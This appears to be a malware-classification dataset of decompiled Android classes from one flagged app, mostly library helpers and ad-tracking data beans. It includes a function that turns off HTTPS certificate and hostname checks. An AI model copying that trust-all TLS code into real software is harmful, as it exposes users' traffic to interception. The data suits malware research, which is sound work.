String getUserAgent(  Context context){     String str;     if (context != null) {       try {         str=context.getString(((Integer)Class.forName(""com.android.internal.R$string"").getDeclaredField(""web_user_agent"").get(null)).intValue());       }  catch (      Throwable th) {         str=null;       }     }  else {       str=null;     }     if (TextUtils.isEmpty(str)) {       str=""Mozilla/5.0 (Linux; U; Android %s) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 %sSafari/533.1"";     }     Locale locale=Locale.getDefault();     StringBuffer stringBuffer=new StringBuffer();     String str2=Build.VERSION.RELEASE;     if (str2.length() > 0) {       stringBuffer.append(str2);     }  else {       stringBuffer.append(""1.0"");     }     stringBuffer.append(""; "");     String language=locale.getLanguage();     if (language != null) {       stringBuffer.append(language.toLowerCase());       String country=locale.getCountry();       if (country != null) {         stringBuffer.append(""-"");         stringBuffer.append(country.toLowerCase());       }     }  else {       stringBuffer.append(""en"");     }     if (""REL"".equals(Build.VERSION.CODENAME)) {       String str3=Build.MODEL;       if (str3.length() > 0) {         stringBuffer.append(""; "");         stringBuffer.append(str3);       }     }     String str4=Build.ID;     if (str4.length() > 0) {       stringBuffer.append("" Build/"");       stringBuffer.append(str4);     }     return String.format(str,stringBuffer,""Mobile "");   }   public static boolean isSupportRange(  HttpResponse httpResponse){     String value;     if (httpResponse == null) {       return false;     }     Header firstHeader=httpResponse.getFirstHeader(""Accept-Ranges"");     if (firstHeader != null) {       return ""bytes"".equals(firstHeader.getValue());     }     Header firstHeader2=httpResponse.getFirstHeader(AsyncHttpClient.HEADER_CONTENT_RANGE);     return (firstHeader2 == null || (value=firstHeader2.getValue()) == null || !value.startsWith(""bytes"")) ? false : true;   }   public static long sizeOfString(  String str,  String str2){     long j=0;     if (TextUtils.isEmpty(str)) {       return 0L;     }     int length=str.length();     if (length < 100) {       return str.getBytes(str2).length;     }     for (int i=0; i < length; i+=100) {       int i2=i + 100;       if (i2 >= length) {         i2=length;       }       j+=getSubString(str,i,i2).getBytes(str2).length;     }     return j;   }   public static void trustAllHttpsURLConnection(){     if (sslSocketFactory == null) {       TrustManager[] trustManagerArr={new X509TrustManager(){         @Override public void checkClientTrusted(        X509Certificate[] x509CertificateArr,        String str){         }         @Override public void checkServerTrusted(        X509Certificate[] x509CertificateArr,        String str){         }         @Override public X509Certificate[] getAcceptedIssuers(){           return null;         }       } };       try {         SSLContext sSLContext=SSLContext.getInstance(""TLS"");         sSLContext.init(null,trustManagerArr,null);         sslSocketFactory=sSLContext.getSocketFactory();       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);       }     }     if (sslSocketFactory != null) {       HttpsURLConnection.setDefaultSSLSocketFactory(sslSocketFactory);       HttpsURLConnection.setDefaultHostnameVerifier(org.apache.http.conn.ssl.SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.util\PreferencesCookieStore.code","public class PreferencesCookieStore implements CookieStore {   private static final String COOKIE_NAME_PREFIX=""cookie_"";   private static final String COOKIE_NAME_STORE=""names"";   private static final String COOKIE_PREFS=""CookiePrefsFile"";   private final SharedPreferences cookiePrefs;   private final ConcurrentHashMap<String,Cookie> cookies=new ConcurrentHashMap<>(); public class SerializableCookie implements Serializable {     private static final long serialVersionUID=6374381828722046732L;     private transient BasicClientCookie clientCookie;     private final transient Cookie cookie;     public SerializableCookie(    Cookie cookie){       this.cookie=cookie;     }     private void readObject(    ObjectInputStream objectInputStream){       this.clientCookie=new BasicClientCookie((String)objectInputStream.readObject(),(String)objectInputStream.readObject());       this.clientCookie.setComment((String)objectInputStream.readObject());       this.clientCookie.setDomain((String)objectInputStream.readObject());       this.clientCookie.setExpiryDate((Date)objectInputStream.readObject());       this.clientCookie.setPath((String)objectInputStream.readObject());       this.clientCookie.setVersion(objectInputStream.readInt());       this.clientCookie.setSecure(objectInputStream.readBoolean());     }     private void writeObject(    ObjectOutputStream objectOutputStream){       objectOutputStream.writeObject(this.cookie.getName());       objectOutputStream.writeObject(this.cookie.getValue());       objectOutputStream.writeObject(this.cookie.getComment());       objectOutputStream.writeObject(this.cookie.getDomain());       objectOutputStream.writeObject(this.cookie.getExpiryDate());       objectOutputStream.writeObject(this.cookie.getPath());       objectOutputStream.writeInt(this.cookie.getVersion());       objectOutputStream.writeBoolean(this.cookie.isSecure());     }     public Cookie getCookie(){       return this.clientCookie != null ? this.clientCookie : this.cookie;     }   }   public PreferencesCookieStore(  Context context){     Cookie decodeCookie;     this.cookiePrefs=context.getSharedPreferences(COOKIE_PREFS,0);     String string=this.cookiePrefs.getString(COOKIE_NAME_STORE,null);     if (string != null) {       for (      String str : TextUtils.split(string,"","")) {         String string2=this.cookiePrefs.getString(COOKIE_NAME_PREFIX + str,null);         if (string2 != null && (decodeCookie=decodeCookie(string2)) != null) {           this.cookies.put(str,decodeCookie);         }       }       clearExpired(new Date());     }   }   @Override public void addCookie(  Cookie cookie){     String name=cookie.getName();     if (cookie.isExpired(new Date())) {       this.cookies.remove(name);     }  else {       this.cookies.put(name,cookie);     }     SharedPreferences.Editor edit=this.cookiePrefs.edit();     edit.putString(COOKIE_NAME_STORE,TextUtils.join("","",this.cookies.keySet()));     edit.putString(COOKIE_NAME_PREFIX + name,encodeCookie(new SerializableCookie(cookie)));     edit.commit();   }   protected String byteArrayToHexString(  byte[] bArr){     StringBuffer stringBuffer=new StringBuffer(bArr.length * 2);     for (    byte b : bArr) {       int i=b & 255;       if (i < 16) {         stringBuffer.append('0');       }       stringBuffer.append(Integer.toHexString(i));     }     return stringBuffer.toString().toUpperCase();   }   @Override public void clear(){     SharedPreferences.Editor edit=this.cookiePrefs.edit();     Iterator<String> it=this.cookies.keySet().iterator();     while (it.hasNext()) {       edit.remove(COOKIE_NAME_PREFIX + it.next());     }     edit.remove(COOKIE_NAME_STORE);     edit.commit();     this.cookies.clear();   }   @Override public boolean clearExpired(  Date date){     boolean z;     boolean z2=false;     SharedPreferences.Editor edit=this.cookiePrefs.edit();     Iterator<Map.Entry<String,Cookie>> it=this.cookies.entrySet().iterator();     while (true) {       z=z2;       if (!it.hasNext()) {         break;       }       Map.Entry<String,Cookie> next=it.next();       String key=next.getKey();       Cookie value=next.getValue();       if (value.getExpiryDate() == null || value.isExpired(date)) {         this.cookies.remove(key);         edit.remove(COOKIE_NAME_PREFIX + key);         z2=true;       }  else {         z2=z;       }     }     if (z) {       edit.putString(COOKIE_NAME_STORE,TextUtils.join("","",this.cookies.keySet()));     }     edit.commit();     return z;   }   protected Cookie decodeCookie(  String str){     try {       return ((SerializableCookie)new ObjectInputStream(new ByteArrayInputStream(hexStringToByteArray(str))).readObject()).getCookie();     }  catch (    Throwable th) {       LogUtils.e(th.getMessage(),th);       return null;     }   }   protected String encodeCookie(  SerializableCookie serializableCookie){     ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();     try {       new ObjectOutputStream(byteArrayOutputStream).writeObject(serializableCookie);       return byteArrayToHexString(byteArrayOutputStream.toByteArray());     }  catch (    Throwable th) {       return null;     }   }   public Cookie getCookie(  String str){     return this.cookies.get(str);   }   @Override public List<Cookie> getCookies(){     return new ArrayList(this.cookies.values());   }   protected byte[] hexStringToByteArray(  String str){     int length=str.length();     byte[] bArr=new byte[length / 2];     for (int i=0; i < length; i+=2) {       bArr[i / 2]=(byte)((Character.digit(str.charAt(i),16) << 4) + Character.digit(str.charAt(i + 1),16));     }     return bArr;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.util\SerializableCookie.code","public class SerializableCookie implements Serializable {   private static final long serialVersionUID=6374381828722046732L;   private transient BasicClientCookie clientCookie;   private final transient Cookie cookie;   public SerializableCookie(  Cookie cookie){     this.cookie=cookie;   }   private void readObject(  ObjectInputStream objectInputStream){     this.clientCookie=new BasicClientCookie((String)objectInputStream.readObject(),(String)objectInputStream.readObject());     this.clientCookie.setComment((String)objectInputStream.readObject());     this.clientCookie.setDomain((String)objectInputStream.readObject());     this.clientCookie.setExpiryDate((Date)objectInputStream.readObject());     this.clientCookie.setPath((String)objectInputStream.readObject());     this.clientCookie.setVersion(objectInputStream.readInt());     this.clientCookie.setSecure(objectInputStream.readBoolean());   }   private void writeObject(  ObjectOutputStream objectOutputStream){     objectOutputStream.writeObject(this.cookie.getName());     objectOutputStream.writeObject(this.cookie.getValue());     objectOutputStream.writeObject(this.cookie.getComment());     objectOutputStream.writeObject(this.cookie.getDomain());     objectOutputStream.writeObject(this.cookie.getExpiryDate());     objectOutputStream.writeObject(this.cookie.getPath());     objectOutputStream.writeInt(this.cookie.getVersion());     objectOutputStream.writeBoolean(this.cookie.isSecure());   }   public Cookie getCookie(){     return this.clientCookie != null ? this.clientCookie : this.cookie;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.view\DynamicHandler.code","public class DynamicHandler implements InvocationHandler {   private WeakReference<Object> handlerRef;   private final HashMap<String,Method> methodMap=new HashMap<>(1);   public DynamicHandler(  Object obj){     this.handlerRef=new WeakReference<>(obj);   }   public void addMethod(  String str,  Method method){     this.methodMap.put(str,method);   }   public Object getHandler(){     return this.handlerRef.get();   }   @Override public Object invoke(  Object obj,  Method method,  Object[] objArr){     Object obj2=this.handlerRef.get();     if (obj2 != null) {       Method method2=this.methodMap.get(method.getName());       if (method2 != null) {         return method2.invoke(obj2,objArr);       }     }     return null;   }   public void setHandler(  Object obj){     this.handlerRef=new WeakReference<>(obj);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.view\EventListenerManager.code","public class EventListenerManager {   private static final DoubleKeyValueMap<ViewInjectInfo,Class<?>,Object> listenerCache=new DoubleKeyValueMap<>(); public class DynamicHandler implements InvocationHandler {     private WeakReference<Object> handlerRef;     private final HashMap<String,Method> methodMap=new HashMap<>(1);     public DynamicHandler(    Object obj){       this.handlerRef=new WeakReference<>(obj);     }     public void addMethod(    String str,    Method method){       this.methodMap.put(str,method);     }     public Object getHandler(){       return this.handlerRef.get();     }     @Override public Object invoke(    Object obj,    Method method,    Object[] objArr){       Object obj2=this.handlerRef.get();       if (obj2 != null) {         Method method2=this.methodMap.get(method.getName());         if (method2 != null) {           return method2.invoke(obj2,objArr);         }       }       return null;     }     public void setHandler(    Object obj){       this.handlerRef=new WeakReference<>(obj);     }   }   private EventListenerManager(){   }   public static void addEventMethod(  ViewFinder viewFinder,  ViewInjectInfo viewInjectInfo,  Annotation annotation,  Object obj,  Method method){     boolean z;     Object obj2;     try {       View findViewByInfo=viewFinder.findViewByInfo(viewInjectInfo);       if (findViewByInfo != null) {         EventBase eventBase=(EventBase)annotation.annotationType().getAnnotation(EventBase.class);         Class<?> listenerType=eventBase.listenerType();         String listenerSetter=eventBase.listenerSetter();         String methodName=eventBase.methodName();         Object obj3=listenerCache.get(viewInjectInfo,listenerType);         if (obj3 != null) {           DynamicHandler dynamicHandler=(DynamicHandler)Proxy.getInvocationHandler(obj3);           boolean equals=obj.equals(dynamicHandler.getHandler());           if (equals) {             dynamicHandler.addMethod(methodName,method);           }           z=equals;         }  else {           z=false;         }         if (z) {           obj2=obj3;         }  else {           DynamicHandler dynamicHandler2=new DynamicHandler(obj);           dynamicHandler2.addMethod(methodName,method);           obj2=Proxy.newProxyInstance(listenerType.getClassLoader(),new Class[]{listenerType},dynamicHandler2);           listenerCache.put(viewInjectInfo,listenerType,obj2);         }         findViewByInfo.getClass().getMethod(listenerSetter,listenerType).invoke(findViewByInfo,obj2);       }     }  catch (    Throwable th) {       LogUtils.e(th.getMessage(),th);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.view\ResLoader.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6efb1b6c"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.view\ViewFinder.code","public class ViewFinder {   private Activity activity;   private PreferenceActivity preferenceActivity;   private PreferenceGroup preferenceGroup;   private View view;   public ViewFinder(  Activity activity){     this.activity=activity;   }   public ViewFinder(  PreferenceActivity preferenceActivity){     this.preferenceActivity=preferenceActivity;     this.activity=preferenceActivity;   }   public ViewFinder(  PreferenceGroup preferenceGroup){     this.preferenceGroup=preferenceGroup;   }   public ViewFinder(  View view){     this.view=view;   }   public Preference findPreference(  CharSequence charSequence){     return this.preferenceGroup == null ? this.preferenceActivity.findPreference(charSequence) : this.preferenceGroup.findPreference(charSequence);   }   public View findViewById(  int i){     return this.activity == null ? this.view.findViewById(i) : this.activity.findViewById(i);   }   public View findViewById(  int i,  int i2){     View findViewById=i2 > 0 ? findViewById(i2) : null;     return findViewById != null ? findViewById.findViewById(i) : findViewById(i);   }   public View findViewByInfo(  ViewInjectInfo viewInjectInfo){     return findViewById(((Integer)viewInjectInfo.value).intValue(),viewInjectInfo.parentId);   }   public Context getContext(){     if (this.view != null) {       return this.view.getContext();     }     if (this.activity != null) {       return this.activity;     }     if (this.preferenceActivity != null) {       return this.preferenceActivity;     }     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.view\ViewInjectInfo.code","public class ViewInjectInfo {   public int parentId;   public Object value;   public boolean equals(  Object obj){     if (this == obj) {       return true;     }     if (!(obj instanceof ViewInjectInfo)) {       return false;     }     ViewInjectInfo viewInjectInfo=(ViewInjectInfo)obj;     if (this.parentId != viewInjectInfo.parentId) {       return false;     }     return this.value == null ? viewInjectInfo.value == null : this.value.equals(viewInjectInfo.value);   }   public int hashCode(){     return (this.value.hashCode() * 31) + this.parentId;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.loopj.android.image\BitmapImage.code","public class BitmapImage implements SmartImage {   private Bitmap bitmap;   public BitmapImage(  Bitmap bitmap){     this.bitmap=bitmap;   }   @Override public Bitmap getBitmap(  Context context){     return this.bitmap;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.loopj.android.image\ContactImage.code","public class ContactImage implements SmartImage {   private long contactId;   public ContactImage(  long j){     this.contactId=j;   }   @Override public Bitmap getBitmap(  Context context){     try {       InputStream openContactPhotoInputStream=ContactsContract.Contacts.openContactPhotoInputStream(context.getContentResolver(),ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,this.contactId));       if (openContactPhotoInputStream != null) {         return BitmapFactory.decodeStream(openContactPhotoInputStream);       }       return null;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.loopj.android.image\OnCompleteHandler.code","public class OnCompleteHandler extends Handler {   @Override public void handleMessage(  Message message){     onComplete((Bitmap)message.obj);   }   public void onComplete(  Bitmap bitmap){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.loopj.android.image\OnCompleteListener.code","public abstract class OnCompleteListener {   public abstract void onComplete();   public void onComplete(  Bitmap bitmap){     onComplete();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.loopj.android.image\SmartImage.code","public interface SmartImage {   Bitmap getBitmap(  Context context); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.loopj.android.image\SmartImageTask.code","public class SmartImageTask implements Runnable {   private static final int BITMAP_READY=0;   private boolean cancelled=false;   private Context context;   private SmartImage image;   private OnCompleteHandler onCompleteHandler; public class OnCompleteHandler extends Handler {     @Override public void handleMessage(    Message message){       onComplete((Bitmap)message.obj);     }     public void onComplete(    Bitmap bitmap){     }   } public abstract class OnCompleteListener {     public abstract void onComplete();     public void onComplete(    Bitmap bitmap){       onComplete();     }   }   public SmartImageTask(  Context context,  SmartImage smartImage){     this.image=smartImage;     this.context=context;   }   public void cancel(){     this.cancelled=true;   }   public void complete(  Bitmap bitmap){     if (this.onCompleteHandler == null || this.cancelled) {       return;     }     this.onCompleteHandler.sendMessage(this.onCompleteHandler.obtainMessage(0,bitmap));   }   @Override public void run(){     if (this.image != null) {       complete(this.image.getBitmap(this.context));       this.context=null;     }   }   public void setOnCompleteHandler(  OnCompleteHandler onCompleteHandler){     this.onCompleteHandler=onCompleteHandler;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.loopj.android.image\SmartImageView.code","public class SmartImageView extends ImageView {   private static final int LOADING_THREADS=4;   public static ExecutorService threadPool=Executors.newFixedThreadPool(4);   private SmartImageTask currentTask;   public SmartImageView(  Context context){     super(context);   }   public SmartImageView(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);   }   public SmartImageView(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);   }   public static void cancelAllTasks(){     threadPool.shutdownNow();     threadPool=Executors.newFixedThreadPool(4);   }   public void setImage(  SmartImage smartImage){     setImage(smartImage,null,null,null);   }   public void setImage(  SmartImage smartImage,  SmartImageTask.OnCompleteListener onCompleteListener){     setImage(smartImage,null,null,onCompleteListener);   }   public void setImage(  SmartImage smartImage,  Integer num){     setImage(smartImage,num,num,null);   }   public void setImage(  SmartImage smartImage,  Integer num,  SmartImageTask.OnCompleteListener onCompleteListener){     setImage(smartImage,num,num,onCompleteListener);   }   public void setImage(  SmartImage smartImage,  Integer num,  Integer num2){     setImage(smartImage,num,num2,null);   }   public void setImage(  SmartImage smartImage,  final Integer num,  Integer num2,  final SmartImageTask.OnCompleteListener onCompleteListener){     if (num2 != null) {       setImageResource(num2.intValue());     }     if (this.currentTask != null) {       this.currentTask.cancel();       this.currentTask=null;     }     this.currentTask=new SmartImageTask(getContext(),smartImage);     this.currentTask.setOnCompleteHandler(new SmartImageTask.OnCompleteHandler(){       @Override public void onComplete(      Bitmap bitmap){         if (bitmap != null) {           SmartImageView.this.setImageBitmap(bitmap);         }  else         if (num != null) {           SmartImageView.this.setImageResource(num.intValue());         }         if (onCompleteListener != null) {           onCompleteListener.onComplete(bitmap);         }       }     } );     threadPool.execute(this.currentTask);   }   public void setImageContact(  long j){     setImage(new ContactImage(j));   }   public void setImageContact(  long j,  Integer num){     setImage(new ContactImage(j),num);   }   public void setImageContact(  long j,  Integer num,  Integer num2){     setImage(new ContactImage(j),num,num);   }   public void setImageUrl(  String str){     setImage(new WebImage(str));   }   public void setImageUrl(  String str,  SmartImageTask.OnCompleteListener onCompleteListener){     setImage(new WebImage(str),onCompleteListener);   }   public void setImageUrl(  String str,  Integer num){     setImage(new WebImage(str),num);   }   public void setImageUrl(  String str,  Integer num,  SmartImageTask.OnCompleteListener onCompleteListener){     setImage(new WebImage(str),num,onCompleteListener);   }   public void setImageUrl(  String str,  Integer num,  Integer num2){     setImage(new WebImage(str),num,num2);   }   public void setImageUrl(  String str,  Integer num,  Integer num2,  SmartImageTask.OnCompleteListener onCompleteListener){     setImage(new WebImage(str),num,num2,onCompleteListener);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.loopj.android.image\WebImage.code","public class WebImage implements SmartImage {   private static final int CONNECT_TIMEOUT=5000;   private static final int READ_TIMEOUT=10000;   private static WebImageCache webImageCache;   private String url;   public WebImage(  String str){     this.url=str;   }   private Bitmap getBitmapFromUrl(  String str){     try {       URLConnection openConnection=new URL(str).openConnection();       openConnection.setConnectTimeout(5000);       openConnection.setReadTimeout(10000);       return BitmapFactory.decodeStream((InputStream)openConnection.getContent());     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public static void removeFromCache(  String str){     if (webImageCache != null) {       webImageCache.remove(str);     }   }   @Override public Bitmap getBitmap(  Context context){     if (webImageCache == null) {       webImageCache=new WebImageCache(context);     }     Bitmap bitmap=null;     if (this.url != null && (bitmap=webImageCache.get(this.url)) == null && (bitmap=getBitmapFromUrl(this.url)) != null) {       webImageCache.put(this.url,bitmap);     }     return bitmap;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.loopj.android.image\WebImageCache.code","public class WebImageCache {   private static final String DISK_CACHE_PATH=""/web_image_cache/"";   private boolean diskCacheEnabled;   private String diskCachePath;   private ConcurrentHashMap<String,SoftReference<Bitmap>> memoryCache=new ConcurrentHashMap<>();   private ExecutorService writeThread;   public WebImageCache(  Context context){     this.diskCacheEnabled=false;     this.diskCachePath=context.getApplicationContext().getCacheDir().getAbsolutePath() + DISK_CACHE_PATH;     File file=new File(this.diskCachePath);     file.mkdirs();     this.diskCacheEnabled=file.exists();     this.writeThread=Executors.newSingleThreadExecutor();   }   private void cacheBitmapToDisk(  final String str,  final Bitmap bitmap){     this.writeThread.execute(new Runnable(){       @Override public void run(){         throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.loopj.android.image.WebImageCache.AnonymousClass1.run():void"");       }     } );   }   private void cacheBitmapToMemory(  String str,  Bitmap bitmap){     this.memoryCache.put(getCacheKey(str),new SoftReference<>(bitmap));   }   private Bitmap getBitmapFromDisk(  String str){     if (!this.diskCacheEnabled) {       return null;     }     String filePath=getFilePath(str);     if (new File(filePath).exists()) {       return BitmapFactory.decodeFile(filePath);     }     return null;   }   private Bitmap getBitmapFromMemory(  String str){     SoftReference<Bitmap> softReference=this.memoryCache.get(getCacheKey(str));     if (softReference != null) {       return softReference.get();     }     return null;   }   public String getCacheKey(  String str){     if (str == null) {       throw new RuntimeException(""Null url passed in"");     }     return str.replaceAll(""[.:/,%?&=]"",""+"").replaceAll(""[+]+"",""+"");   }   private String getFilePath(  String str){     return this.diskCachePath + getCacheKey(str);   }   public void clear(){     this.memoryCache.clear();     File file=new File(this.diskCachePath);     if (file.exists() && file.isDirectory()) {       File[] listFiles=file.listFiles();       for (      File file2 : listFiles) {         if (file2.exists() && file2.isFile()) {           file2.delete();         }       }     }   }   public Bitmap get(  String str){     Bitmap bitmapFromMemory=getBitmapFromMemory(str);     if (bitmapFromMemory == null && (bitmapFromMemory=getBitmapFromDisk(str)) != null) {       cacheBitmapToMemory(str,bitmapFromMemory);     }     return bitmapFromMemory;   }   public void put(  String str,  Bitmap bitmap){     cacheBitmapToMemory(str,bitmap);     cacheBitmapToDisk(str,bitmap);   }   public void remove(  String str){     if (str == null) {       return;     }     this.memoryCache.remove(getCacheKey(str));     File file=new File(this.diskCachePath,getCacheKey(str));     if (file.exists() && file.isFile()) {       file.delete();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model\BusinessDataContext.code","public class BusinessDataContext<T extends AdInfo> {   private int adType;   private String appKey;   private CallbackListener callbackListener;   private Context context;   private int count;   private a<T> dbHelper;   private int gzip;   private Handler handler;   private boolean hasCache;   private boolean isInterrupt;   private boolean isNotNeedCache;   private boolean isRetryRequest;   private boolean noNeedCallback;   private byte[] requestByteData;   private e<T> requestCallBack;   private RootNode<T> requestData;   private byte[] responseByteData;   private RootNode<T> responseData;   private int stateCode;   private String url;   public int getAdType(){     return this.adType;   }   public String getAppKey(){     return this.appKey;   }   public CallbackListener getCallbackListener(){     return this.callbackListener;   }   public Context getContext(){     return this.context;   }   public int getCount(){     return this.count;   }   public a<T> getDbHelper(){     return this.dbHelper;   }   public int getGzip(){     return this.gzip;   }   public Handler getHandler(){     return this.handler;   }   public byte[] getRequestByteData(){     return this.requestByteData;   }   public e<T> getRequestCallBack(){     return this.requestCallBack;   }   public RootNode<T> getRequestData(){     return this.requestData;   }   public byte[] getResponseByteData(){     return this.responseByteData;   }   public RootNode<T> getResponseData(){     return this.responseData;   }   public int getStateCode(){     return this.stateCode;   }   public String getUrl(){     return this.url;   }   public boolean isHasCache(){     return this.hasCache;   }   public boolean isInterrupt(){     return this.isInterrupt;   }   public boolean isNoNeedCallback(){     return this.noNeedCallback;   }   public boolean isNotNeedCache(){     return this.isNotNeedCache;   }   public boolean isRetryRequest(){     return this.isRetryRequest;   }   public void setAdType(  int i){     this.adType=i;   }   public void setAppKey(  String str){     this.appKey=str;   }   public void setCallbackListener(  CallbackListener callbackListener){     this.callbackListener=callbackListener;   }   public void setContext(  Context context){     this.context=context;   }   public void setCount(  int i){     this.count=i;   }   public void setDbHelper(  a<T> aVar){     this.dbHelper=aVar;   }   public void setGzip(  int i){     this.gzip=i;   }   public void setHandler(  Handler handler){     this.handler=handler;   }   public void setHasCache(  boolean z){     this.hasCache=z;   }   public void setInterrupt(  boolean z){     this.isInterrupt=z;   }   public void setNoNeedCallback(  boolean z){     this.noNeedCallback=z;   }   public void setNotNeedCache(  boolean z){     this.isNotNeedCache=z;   }   public void setRequestByteData(  byte[] bArr){     this.requestByteData=bArr;   }   public void setRequestCallBack(  e<T> eVar){     this.requestCallBack=eVar;   }   public void setRequestData(  RootNode<T> rootNode){     this.requestData=rootNode;   }   public void setResponseByteData(  byte[] bArr){     this.responseByteData=bArr;   }   public void setResponseData(  RootNode<T> rootNode){     this.responseData=rootNode;   }   public void setRetryRequest(  boolean z){     this.isRetryRequest=z;   }   public void setStateCode(  int i){     this.stateCode=i;   }   public void setUrl(  String str){     this.url=str;   }   public String toString(){     return ""BusinessDataContext [url="" + this.url + "", isRetryRequest=""+ this.isRetryRequest+ "", adType=""+ this.adType+ "", appKey=""+ this.appKey+ "", hasCache=""+ this.hasCache+ "", gzip=""+ this.gzip+ "", requestData=""+ this.requestData+ "", requestByteData=""+ Arrays.toString(this.requestByteData)+ "", stateCode=""+ this.stateCode+ "", responseData=""+ this.responseData+ "", responseByteData=""+ Arrays.toString(this.responseByteData)+ ""]"";   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model\ResponseDataContext.code","public class ResponseDataContext {   private int adType;   private int gzip;   private boolean hasCache;   private byte[] responseByteData;   private RootNode<?> responseData;   private int stateCode;   public int getAdType(){     return this.adType;   }   public int getGzip(){     return this.gzip;   }   public byte[] getResponseByteData(){     return this.responseByteData;   }   public RootNode<?> getResponseData(){     return this.responseData;   }   public int getStateCode(){     return this.stateCode;   }   public boolean isHasCache(){     return this.hasCache;   }   public void setAdType(  int i){     this.adType=i;   }   public void setGzip(  int i){     this.gzip=i;   }   public void setHasCache(  boolean z){     this.hasCache=z;   }   public void setResponseByteData(  byte[] bArr){     this.responseByteData=bArr;   }   public void setResponseData(  RootNode<?> rootNode){     this.responseData=rootNode;   }   public void setStateCode(  int i){     this.stateCode=i;   }   public String toString(){     return ""ResponseDataContext [adType="" + this.adType + "", responseData=""+ this.responseData+ "", responseByteData=""+ Arrays.toString(this.responseByteData)+ "", hasCache=""+ this.hasCache+ "", gzip=""+ this.gzip+ "", stateCode=""+ this.stateCode+ ""]"";   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\Action.code","public class Action {   @Since(1.0d) @SerializedName(""action"") @Expose private Integer action;   @Since(1.0d) @SerializedName(""adId"") @Expose private Integer adId;   @Since(1.0d) @SerializedName(""appName"") @Expose private String appName;   @Since(1.0d) @SerializedName(""count"") @Expose private Integer count;   @Since(1.0d) @SerializedName(""date"") @Expose private String date;   @Since(1.0d) @SerializedName(""packageName"") @Expose private String packageName;   public Integer getAction(){     return this.action;   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public Integer getCount(){     return this.count;   }   public String getDate(){     return this.date;   }   public String getPackageName(){     return this.packageName;   }   public void setAction(  Integer num){     this.action=num;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setCount(  Integer num){     this.count=num;   }   public void setDate(  String str){     this.date=str;   }   public void setPackageName(  String str){     this.packageName=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\ActionExt.code","public class ActionExt extends Action {   private int expireDate;   public int getExpireDate(){     return this.expireDate;   }   public void setExpireDate(  int i){     this.expireDate=i;   } } "
